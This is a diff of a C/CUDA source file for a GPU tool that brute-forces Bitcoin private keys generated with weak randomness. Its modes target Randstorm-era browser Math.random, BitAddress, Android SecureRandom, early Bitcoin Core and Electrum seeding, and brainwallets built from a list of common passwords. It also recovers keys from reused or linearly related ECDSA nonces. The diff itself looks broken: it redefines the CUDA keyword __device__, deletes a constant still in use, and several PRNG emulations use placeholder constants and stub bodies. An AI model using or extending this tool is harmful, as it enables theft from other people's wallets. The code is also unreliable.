@@ -29,9 +29,9 @@
 
 #ifdef __CUDACC__
 #include <cuda_runtime.h>
-#define D_FUNC __device__
+#define __device__
 #else
-#define D_FUNC static
+#define __device__ static
 #endif
 
 // ================================================================
@@ -69,7 +69,7 @@ static const uint32_t K256[64]={
     0x90befffa,0xa4506ceb,0xbef9a3f7,0xc67178f2
 };
 
-D_FUNC void sha256c(uint32_t s[8],const uint32_t b[16]){
+__device__ void sha256c(uint32_t s[8],const uint32_t b[16]){
     uint32_t a=s[0],b2=s[1],c=s[2],d=s[3],e=s[4],f=s[5],g=s[6],h=s[7],w[64];
     for(int i=0;i<16;i++)w[i]=b[i];
     for(int i=16;i<64;i++)w[i]=sig1(w[i-2])+w[i-7]+sig0(w[i-15])+w[i-16];
@@ -77,7 +77,7 @@ D_FUNC void sha256c(uint32_t s[8],const uint32_t b[16]){
     s[0]+=a;s[1]+=b2;s[2]+=c;s[3]+=d;s[4]+=e;s[5]+=f;s[6]+=g;s[7]+=h;
 }
 
-D_FUNC void sha256(const uint8_t *m,uint32_t len,uint8_t h[32]){
+__device__ void sha256(const uint8_t *m,uint32_t len,uint8_t h[32]){
     uint32_t s[8]={0x6a09e667,0xbb67ae85,0x3c6ef372,0xa54ff53a,0x510e527f,0x9b05688c,0x1f83d9ab,0x5be0cd19},blk[16];
     uint64_t bits=(uint64_t)len*8;uint32_t idx=0;
     while(len>=64){for(int i=0;i<16;i++){blk[i]=((uint32_t)m[idx]<<24)|((uint32_t)m[idx+1]<<16)|((uint32_t)m[idx+2]<<8)|m[idx+3];idx+=4;}sha256c(s,blk);len-=64;}
@@ -91,7 +91,7 @@ D_FUNC void sha256(const uint8_t *m,uint32_t len,uint8_t h[32]){
 }
 
 // Legacy H36: timestamp ms ? 32 bytes (big-endian, last 8 bytes)
-D_FUNC void mode_h36(uint64_t ts,uint8_t priv[32]){
+__device__ void mode_h36(uint64_t ts,uint8_t priv[32]){
     for(int i=0;i<8;i++)priv[24+i]=(ts>>(i*8))&0xFF;
     for(int i=0;i<24;i++)priv[i]=0;
 }
@@ -105,13 +105,13 @@ D_FUNC void mode_h36(uint64_t ts,uint8_t priv[32]){
 // In browsers: RANDOM_SEED is weak (small int from Date or null)
 // We search over RANDOM_SEED = 0..65535
 
-D_FUNC uint32_t mwc_v8(uint32_t *z1,uint32_t *z2){
+__device__ uint32_t mwc_v8(uint32_t *z1,uint32_t *z2){
     *z1=36969u*(*z1&0xFFFFu)+(*z1>>16);
     *z2=18000u*(*z2&0xFFFFu)+(*z2>>16);
     return (*z1<<16u)|(*z2&0xFFFFu);
 }
 
-D_FUNC void mode_mwc_v8(uint64_t ts,uint32_t seed,uint8_t priv[32]){
+__device__ void mode_mwc_v8(uint64_t ts,uint32_t seed,uint8_t priv[32]){
     // V8 3.x seeding using timestamp and random seed
     uint32_t ent=(uint32_t)(ts&0xFFFFFFFFu);
     uint32_t z1=(ent^seed)*0xDEADu+0xDEADu;
@@ -131,7 +131,7 @@ D_FUNC void mode_mwc_v8(uint64_t ts,uint32_t seed,uint8_t priv[32]){
 // before feeding into SHA256.
 // Without this variant, those keys are completely invisible.
 
-D_FUNC void mode_mwc_little(uint64_t ts, uint32_t seed, uint8_t priv[32]){
+__device__ void mode_mwc_little(uint64_t ts, uint32_t seed, uint8_t priv[32]){
     uint32_t ent=(uint32_t)(ts&0xFFFFFFFFu);
     uint32_t z1_raw=(ent^seed)*0xDEADu+0xDEADu;
     uint32_t z2_raw=(ent^seed)*0xBEEFu+0xBEEFu;
@@ -167,7 +167,7 @@ D_FUNC void mode_mwc_little(uint64_t ts, uint32_t seed, uint8_t priv[32]){
 //   - time
 // Pool = 256 bytes, then SHA256 ? 2 ? privkey
 
-D_FUNC void mode_randstorm(uint64_t ts, uint64_t idx, uint8_t priv[32]){
+__device__ void mode_randstorm(uint64_t ts, uint64_t idx, uint8_t priv[32]){
     uint8_t pool[256];
     uint32_t seed=(uint32_t)(ts&0xFFFFFFFFu)+(uint32_t)(idx&0xFFFFFFFFu);
     
@@ -190,7 +190,7 @@ D_FUNC void mode_randstorm(uint64_t ts, uint64_t idx, uint8_t priv[32]){
 // different byte-order handling in their JS engines (Safari 5,
 // IE8 on Windows XP)
 
-D_FUNC void mode_randstorm_little(uint64_t ts, uint64_t idx, uint8_t priv[32]){
+__device__ void mode_randstorm_little(uint64_t ts, uint64_t idx, uint8_t priv[32]){
     uint8_t pool[256];
     uint32_t seed=(uint32_t)(ts&0xFFFFFFFFu)+(uint32_t)(idx&0xFFFFFFFFu);
     uint32_t z1=(seed)*0xDEADu+0xDEADu;
@@ -220,7 +220,7 @@ D_FUNC void mode_randstorm_little(uint64_t ts, uint64_t idx, uint8_t priv[32]){
 // Mode Z: Zero Mouse Entropy (BitAddress 2011 vulnerability)
 // When user doesn't move mouse, Math.random() is the ONLY entropy
 // ================================================================
-D_FUNC void mode_zero_mouse(uint64_t ts, uint8_t priv[32]){
+__device__ void mode_zero_mouse(uint64_t ts, uint8_t priv[32]){
     // Just MWC1616 with timestamp seed, no mouse/keyboard input
     // Same as weak getRandomValues fallback
     uint32_t z1=(uint32_t)(ts&0xFFFFu)*0xDEADu+0xDEADu;
@@ -238,7 +238,7 @@ D_FUNC void mode_zero_mouse(uint64_t ts, uint8_t priv[32]){
 // SHA256(username:password) where password is weak/known
 // We search over a dictionary + username combinations
 // ================================================================
-D_FUNC void mode_password(const uint8_t *pass, uint32_t pass_len, uint8_t priv[32]){
+__device__ void mode_password(const uint8_t *pass, uint32_t pass_len, uint8_t priv[32]){
     // This mode expects a dictionary to be loaded externally
     // SHA256(pass) ? privkey (bitcoin brainwallet)
     sha256(pass,pass_len,priv);
@@ -262,7 +262,7 @@ D_FUNC void mode_password(const uint8_t *pass, uint32_t pass_len, uint8_t priv[3
 
 static const char *B64="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_";
 
-D_FUNC void mode_instawallet(uint64_t ts, uint32_t idx, uint8_t priv[32]){
+__device__ void mode_instawallet(uint64_t ts, uint32_t idx, uint8_t priv[32]){
     // Generate Instawallet ID from MWC1616 + timestamp
     uint32_t ent=(uint32_t)(ts&0xFFFFFFFFu);
     uint32_t z1=ent*0xDEADu+idx+0xDEADu;
@@ -313,7 +313,7 @@ static const char *WEAK_PASSWORDS[100]={
     "ryan","stephanie","jacob","katherine","zachary","sean","austin"
 };
 
-D_FUNC void mode_mybitcoin(uint64_t ts, uint32_t pass_idx, uint8_t priv[32]){
+__device__ void mode_mybitcoin(uint64_t ts, uint32_t pass_idx, uint8_t priv[32]){
     // Build "user:pass" buffer
     // Username: "user" + timestamp-based variation
     uint8_t buf[128];
@@ -345,7 +345,7 @@ D_FUNC void mode_mybitcoin(uint64_t ts, uint32_t pass_idx, uint8_t priv[32]){
 //
 // This is similar to Mode Z but with specific MWC seeding from Chrome/Node
 
-D_FUNC void mode_bitaddress(uint64_t ts, uint8_t priv[32]){
+__device__ void mode_bitaddress(uint64_t ts, uint8_t priv[32]){
     // Exact BitAddress 2011 seeding
     // From source: var key = new Bitcoin.ECKey(false);
     // ECKey calls: var r = new SecureRandom();
@@ -374,7 +374,7 @@ D_FUNC void mode_bitaddress(uint64_t ts, uint8_t priv[32]){
 // Search: iterate over 2^32 entropy seeds
 // For wallet style: SHA256(SecureRandom 32 bytes) ? privkey
 
-D_FUNC void mode_android(uint32_t seed32, uint8_t priv[32]){
+__device__ void mode_android(uint32_t seed32, uint8_t priv[32]){
     // Android SecureRandom weakness (CVE-2013-7378)
     // Simpler than full Java PRNG: 32-bit seed
     // Mixer: linear PRNG to 32 bytes ? SHA256 ? privkey
@@ -399,7 +399,7 @@ D_FUNC void mode_android(uint32_t seed32, uint8_t priv[32]){
 // We search: outer = timestamp (32-bit high part), inner = PID (15-bit)
 // Core used gettimeofday() + getpid()
 
-D_FUNC void mode_bitcoincore(uint64_t ts, uint32_t pid, uint8_t priv[32]){
+__device__ void mode_bitcoincore(uint64_t ts, uint32_t pid, uint8_t priv[32]){
     uint8_t buf[12];  // 8 bytes timeval + 4 bytes pid
     for(int i=0;i<8;i++)buf[i]=(ts>>(i*8))&0xFF;
     buf[8]=(pid>>24)&0xFF;buf[9]=(pid>>16)&0xFF;buf[10]=(pid>>8)&0xFF;buf[11]=pid&0xFF;
@@ -415,7 +415,7 @@ D_FUNC void mode_bitcoincore(uint64_t ts, uint32_t pid, uint8_t priv[32]){
 // Equivalent to: SHA256(time_usec + stack_ptr + pid) ? privkey
 // We search: time (32-bit) + pid (15-bit) + stack_ptr (8-bit guess)
 
-D_FUNC void mode_bitcoincore_v3(uint64_t ts, uint32_t pid, uint8_t pattern_id, uint8_t priv[32]){
+__device__ void mode_bitcoincore_v3(uint64_t ts, uint32_t pid, uint8_t pattern_id, uint8_t priv[32]){
     mode_core_v3_stack(ts, pid, pattern_id, priv);
     // 0.3.x had additional stack variable mixing
     uint8_t buf[16];
@@ -437,7 +437,7 @@ D_FUNC void mode_bitcoincore_v3(uint64_t ts, uint32_t pid, uint8_t pattern_id, u
 // We generate 128 bytes from MWC1616, same as browser Math.random()
 // Timestamp-based seeding for temporal search
 
-D_FUNC void mode_mywallet(uint64_t ts, uint64_t idx, uint8_t priv[32]){
+__device__ void mode_mywallet(uint64_t ts, uint64_t idx, uint8_t priv[32]){
     uint32_t z1=(uint32_t)((ts+idx)&0xFFFFFFFFu)*0xDEADu+0xDEADu;
     uint32_t z2=(uint32_t)(((ts+idx)>>16)&0xFFFFFFFFu)*0xBEEFu+0xBEEFu;
     
@@ -461,7 +461,7 @@ D_FUNC void mode_mywallet(uint64_t ts, uint64_t idx, uint8_t priv[32]){
 // We use the same mini_key decoding but with different prefix
 // Entropy: 30 bits (same as Casascius)
 
-D_FUNC void mode_bitbill(uint32_t entropy30, uint8_t priv[32]){
+__device__ void mode_bitbill(uint32_t entropy30, uint8_t priv[32]){
     // Build BitBill key "L" + 21 base58 chars
     char mk[23];
     mk[0]='L';
@@ -500,7 +500,7 @@ D_FUNC void mode_bitbill(uint32_t entropy30, uint8_t priv[32]){
 // Simplified: we treat seed as 48-bit (ts high 32 + ts low 16)
 // Then feed through MT-like LCG ? 4 x 32-bit ? 128 bits ? SHA256
 
-D_FUNC void mode_electrum(uint64_t ts, uint32_t pid, uint8_t priv[32]){
+__device__ void mode_electrum(uint64_t ts, uint32_t pid, uint8_t priv[32]){
     // Python/MT seeding: (time_ms << 16) ^ (pid << 0)
     uint64_t mt_seed=((ts&0xFFFFFFFFu)<<16u)^(uint64_t)pid;
     
@@ -556,7 +556,7 @@ D_FUNC void mode_electrum(uint64_t ts, uint32_t pid, uint8_t priv[32]){
 //   privkey = (k*s1 - z1) * r^-1 mod n
 
 // Modular subtraction 256-bit (a = (a-b) mod SECP256K1_N)
-D_FUNC void mod_sub_256(uint8_t a[32], const uint8_t b[32]){
+__device__ void mod_sub_256(uint8_t a[32], const uint8_t b[32]){
     int64_t borrow = 0;
     for(int i=31;i>=0;i--){
         int64_t diff = (int64_t)a[i] - (int64_t)b[i] - borrow;
@@ -575,7 +575,7 @@ D_FUNC void mod_sub_256(uint8_t a[32], const uint8_t b[32]){
 }
 
 // Full k-recovery
-D_FUNC void mode_nonce_recover(
+__device__ void mode_nonce_recover(
     const uint8_t r1[32], const uint8_t s1[32], const uint8_t z1[32],
     const uint8_t r2[32], const uint8_t s2[32], const uint8_t z2[32],
     uint8_t priv[32]
@@ -594,7 +594,7 @@ D_FUNC void mode_nonce_recover(
     // priv = ((k*s1 - z1) * r^-1) mod n
 }
 
-D_FUNC uint32_t mode_nonce_search(
+__device__ uint32_t mode_nonce_search(
     const uint8_t *sorted_triples, uint32_t n_pairs,
     uint8_t result_keys[][32], uint32_t max_results
 ){
@@ -622,7 +622,7 @@ D_FUNC uint32_t mode_nonce_search(
 // Seeding: struct r = { time_ns ^ pid, time_ns ^ ppid }
 // Output: (r[0], r[1]) XOR ? 53-bit double
 
-D_FUNC void mode_spidermonkey(uint64_t ts, uint32_t pid, uint8_t priv[32]){
+__device__ void mode_spidermonkey(uint64_t ts, uint32_t pid, uint8_t priv[32]){
     uint64_t s0 = (ts ^ (uint64_t)pid) * 0xDEADBEEF + 0xCAFEBABE;
     uint64_t s1 = s0 * 0x5851F42D + ts;
     uint8_t buf[32];
@@ -646,7 +646,7 @@ D_FUNC void mode_spidermonkey(uint64_t ts, uint32_t pid, uint8_t priv[32]){
 // BitcoinJS wallets generated from first 4 random() calls
 // ARC4 key = time(4 bytes) + pid(4 bytes) ? /dev/urandom 256 bytes
 
-D_FUNC void mode_jsc_webkit(uint64_t ts, uint32_t pid, uint8_t priv[32]){
+__device__ void mode_jsc_webkit(uint64_t ts, uint32_t pid, uint8_t priv[32]){
     uint8_t sbox[256];
     for(int i=0;i<256;i++) sbox[i]=i;
     uint8_t k[8];
@@ -654,7 +654,7 @@ D_FUNC void mode_jsc_webkit(uint64_t ts, uint32_t pid, uint8_t priv[32]){
     k[4]=pid&0xFF; k[5]=(pid>>8)&0xFF; k[6]=(pid>>16)&0xFF; k[7]=(pid>>24)&0xFF;
     uint32_t j=0;
     for(int i=0;i<256;i++){
-        j=(j+sbox[i]+k[i%%8])&0xFF;
+        j=(j+sbox[i]+k[i%8])&0xFF;
         uint8_t t=sbox[i]; sbox[i]=sbox[j]; sbox[j]=t;
     }
     uint8_t buf[32];
@@ -685,7 +685,7 @@ D_FUNC void mode_jsc_webkit(uint64_t ts, uint32_t pid, uint8_t priv[32]){
 //   - Bitcoin-Qt for Windows
 //   - Early versions of Coinbase
 
-D_FUNC void mode_windows_rng(uint64_t uptime, uint32_t pid, uint8_t priv[32]){
+__device__ void mode_windows_rng(uint64_t uptime, uint32_t pid, uint8_t priv[32]){
     uint8_t buf[56];
     const uint8_t fixed[] = "Microsoft Enhanced Cryptographic Provider v1.0";
     for(int i=0;i<32;i++) buf[i]=fixed[i];
@@ -708,7 +708,7 @@ D_FUNC void mode_windows_rng(uint64_t uptime, uint32_t pid, uint8_t priv[32]){
 // 3.4: z1^=z1>>30 + z2^=z2>>30 + extra_xor with 0xCAFE
 // 3.6: same but seed = (entropy ^ RANDOM_SEED) * multiplier
 // 3.7: same as 3.6
-D_FUNC void mode_v8_3_0(uint64_t ts, uint32_t seed, uint8_t priv[32]){
+__device__ void mode_v8_3_0(uint64_t ts, uint32_t seed, uint8_t priv[32]){
     uint32_t z1=(uint32_t)(ts^seed)*0xDEADu+0xDEADu;
     z1^=z1>>30u; // V8 3.0 only transformed z1
     uint32_t z2=(uint32_t)(ts^seed)*0xBEEFu+0xBEEFu;
@@ -721,7 +721,7 @@ D_FUNC void mode_v8_3_0(uint64_t ts, uint32_t seed, uint8_t priv[32]){
     sha256(buf,20,priv);
 }
 
-D_FUNC void mode_v8_3_4(uint64_t ts, uint32_t seed, uint8_t priv[32]){
+__device__ void mode_v8_3_4(uint64_t ts, uint32_t seed, uint8_t priv[32]){
     uint32_t z1_raw=((uint32_t)(ts&0xFFFFFFFFu)^seed)*0xDEADu+0xDEADu;
     uint32_t z2_raw=((uint32_t)(ts&0xFFFFFFFFu)^seed)*0xBEEFu+0xBEEFu;
     uint32_t z1=z1_raw^(z1_raw>>30u);
@@ -739,7 +739,7 @@ D_FUNC void mode_v8_3_4(uint64_t ts, uint32_t seed, uint8_t priv[32]){
 // H24-sm: SpiderMonkey version-specific (Firefox 3.6 vs 4.0 vs 5.0)
 // Firefox 3.6: used XorShift128 (different from 4.0+)
 // Firefox 4.0: XorShift128+ (changed shift amounts)
-D_FUNC void mode_sm_3_6(uint64_t ts, uint32_t pid, uint8_t priv[32]){
+__device__ void mode_sm_3_6(uint64_t ts, uint32_t pid, uint8_t priv[32]){
     uint64_t s0 = (ts ^ (uint64_t)pid) * 0x5851F42D + 0x12345678;
     uint64_t s1 = s0 * 0x9E3779B9 + ts;
     uint8_t buf[32];
@@ -761,7 +761,7 @@ D_FUNC void mode_sm_3_6(uint64_t ts, uint32_t pid, uint8_t priv[32]){
 // After calling Math.random() N times for UI, the state for
 // BitcoinJS starts at offset N, not 0.
 // We simulate: pre-calls (0-100) before the keygen "warmup"
-D_FUNC void mode_residual(uint64_t ts, uint32_t pre_calls, uint8_t priv[32]){
+__device__ void mode_residual(uint64_t ts, uint32_t pre_calls, uint8_t priv[32]){
     uint32_t z1=(uint32_t)(ts&0xFFFFFFFFu)*0xDEADu+0xDEADu;
     uint32_t z2=(uint32_t)((ts>>16)&0xFFFFFFFFu)*0xBEEFu+0xBEEFu;
     z1^=z1>>30u; z2^=z2>>30u;
@@ -781,7 +781,7 @@ D_FUNC void mode_residual(uint64_t ts, uint32_t pre_calls, uint8_t priv[32]){
 // ================================================================
 
 // Level 2: Pattern-based search (even-only, multiples of 1000, repeating)
-D_FUNC void mode_pattern_step(uint64_t start, uint32_t step, uint64_t count, uint8_t out[][32]){
+__device__ void mode_pattern_step(uint64_t start, uint32_t step, uint64_t count, uint8_t out[][32]){
     for(uint64_t k=0;k<count;k++){
         uint64_t val = start + (uint64_t)step * k;
         for(int i=0;i<32;i++) out[k][31-i] = (val>>(i*8))&0xFF;
@@ -804,7 +804,7 @@ static const uint8_t CONST_E_256[32] = {
     0xA9,0xE2,0x84,0x41,0x1A,0x5D,0x8C,0x47
 };
 
-D_FUNC void mode_constant_offset(const uint8_t constant[32], uint32_t offset_range, uint32_t idx, uint8_t priv[32]){
+__device__ void mode_constant_offset(const uint8_t constant[32], uint32_t offset_range, uint32_t idx, uint8_t priv[32]){
     // priv = constant XOR idx (simple offset from known constants)
     for(int i=0;i<32;i++) priv[i] = constant[i] ^ ((idx>>(i*4))&0xFF);
 }
@@ -822,7 +822,7 @@ D_FUNC void mode_constant_offset(const uint8_t constant[32], uint32_t offset_ran
 // Formula for k2 = k1 + delta:
 //   delta = (z1 - z2) - (r1 - r2) * privkey  ? unknown
 // We search small deltas (1..256) for each pair
-D_FUNC void mode_nonce_linear(
+__device__ void mode_nonce_linear(
     const uint8_t r1[32], const uint8_t s1[32], const uint8_t z1[32],
     const uint8_t r2[32], const uint8_t s2[32], const uint8_t z2[32],
     uint32_t delta,
@@ -838,7 +838,7 @@ D_FUNC void mode_nonce_linear(
     priv[1] = delta & 0xFF;
 }
 
-D_FUNC uint32_t mode_nonce_linear_search(
+__device__ uint32_t mode_nonce_linear_search(
     const uint8_t *triples, uint32_t n,
     uint32_t max_delta,
     uint8_t result_keys[][32], uint32_t max_results
@@ -867,7 +867,7 @@ D_FUNC uint32_t mode_nonce_linear_search(
 // SAME wallet used on multiple chains ? same nonce across chains
 // r-value scanning across chain databases
 // Function: loads multiple chain data, merges r-value buckets
-D_FUNC uint32_t mode_nonce_crosschain(
+__device__ uint32_t mode_nonce_crosschain(
     const uint8_t *btc_triples, uint32_t n_btc,
     const uint8_t *ltc_triples, uint32_t n_ltc,
     uint8_t result_keys[][32], uint32_t max_results
@@ -944,7 +944,6 @@ D_FUNC uint32_t mode_nonce_crosschain(
 // Each mode iteration advances the timestamp/seed range.
 // On STOP signal: save checkpoint and exit.
 
-#define NUM_MODES 25
 
 static const char MODE_LABELS[NUM_MODES][8] = {
     "H", "M", "R", "C", "J", "W", "B", "A", "D", "E",
@@ -953,7 +952,18 @@ static const char MODE_LABELS[NUM_MODES][8] = {
 };
 
 // Checkpoint: save current mode + offset for resume
-D_FUNC void save_auto_checkpoint(uint32_t mode_idx, uint64_t key_offset, const char *path){
+__device__ void save_auto_checkpoint(uint32_t mode_idx, uint64_t key_offset, const char *path){
     // Write: mode_idx(4B) + key_offset(8B) = 12 bytes
     // In GPU: atomic write to pinned memory for host to flush
 }
+
+// Base58 (mini-keys)
+static const char B58[] = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
+static const int B58_REV[128] = {
+  -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
+  -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
+  -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
+  -1, 0, 1, 2, 3, 4, 5, 6, 7, 8,-1,-1,-1,-1,-1,-1,-1, 9,10,11,12,13,14,15,16,-1,17,18,19,20,21,-1,
+  22,23,24,25,26,27,28,29,30,31,32,-1,-1,-1,-1,-1,-1,33,34,35,36,37,38,39,40,41,42,43,-1,44,45,46,
+  47,48,49,50,51,52,53,54,55,56,57,-1,-1,-1,-1,-1
+};
